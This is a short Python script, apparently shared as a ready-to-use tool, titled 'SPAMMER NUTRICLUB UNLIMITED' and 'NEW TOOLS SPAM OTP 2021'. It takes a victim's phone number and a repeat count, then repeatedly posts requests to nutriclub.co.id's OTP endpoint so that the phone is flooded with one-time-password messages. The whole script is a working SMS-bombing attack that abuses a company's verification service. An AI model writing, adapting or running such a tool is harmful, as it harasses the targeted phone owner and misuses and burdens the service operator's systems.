import json
from subprocess import call
from urllib import request

call(
	'clear'
)
print("""
	=======================
	= Author : MAR        =
	= YT     : M ALFIKRI R=
	=======================
	    By : RAMADHANI 
	=======================
	SPAMMER NUTRICLUB UNLIMITED
	NEW TOOLS SPAM OTP 2021
	One Time Pasword
		"""
)
print(
	' CONTOH : 0895xxxxxx'
)
nomor=input(
	' NO TARGET : '
)

while True:
	try:
		mex=int(
					input(
				' JUMLAH SPAM OTP ? : '
			)
		)
		print(),;break
	except : continue
		
for max in range(mex):
	req = request.Request(
		'https://www.nutriclub.co.id/otp/?phone='+nomor+'&old_phone='+nomor, method="POST"
	)
	r = json.loads(
				request.urlopen(
					req
				).read(
			)
		)
	if r['StatusCode']=='00':
		print(
					'['+str(
				max+1
			).zfill(2)+']'+' berhasil mengirim otp '+nomor[0:6]+'xxxx'
		)
	else:
		print(
					'['+str(
				max+1
			).zfill(2)+']'+' gagal mengirim otp '+nomor[0:6]+'xxxx'
		)
	__import__(
				"time"
			).sleep(
		2
	)